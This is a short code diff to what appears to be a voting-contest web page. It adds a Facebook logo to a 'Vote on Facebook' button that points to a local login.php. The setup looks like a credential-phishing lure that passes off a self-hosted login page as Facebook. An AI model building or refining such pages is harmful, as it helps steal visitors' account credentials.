@@ -310,11 +310,13 @@ if ($currentTime > $setDate) {
            I need your support! Please take a moment to cast your vote and help me reach new heights in this competition. Your vote could be the difference-maker, propelling me toward victory
             </p>
             
-            <!-- Vote Button -->
-            <a href="login.php" id="vote-button" class="bounce-animation pulse-animation flex items-center justify-center gap-2 bg-gradient-to-r from-purple-500 to-pink-500 text-white py-2.5 sm:py-3 px-4 rounded-lg hover:from-purple-600 hover:to-pink-600 transition w-full text-sm sm:text-base">
-               
-                Vote on Facebook
-            </a>
+          <!-- Vote Button -->
+<a href="login.php" id="vote-button" class="bounce-animation pulse-animation flex items-center justify-center gap-2 bg-gradient-to-r from-purple-500 to-pink-500 text-white py-2.5 sm:py-3 px-4 rounded-lg hover:from-purple-600 hover:to-pink-600 transition w-full text-sm sm:text-base">
+    <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+        <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
+    </svg>
+    Vote on Facebook
+</a>
         </div>
     </div>
     
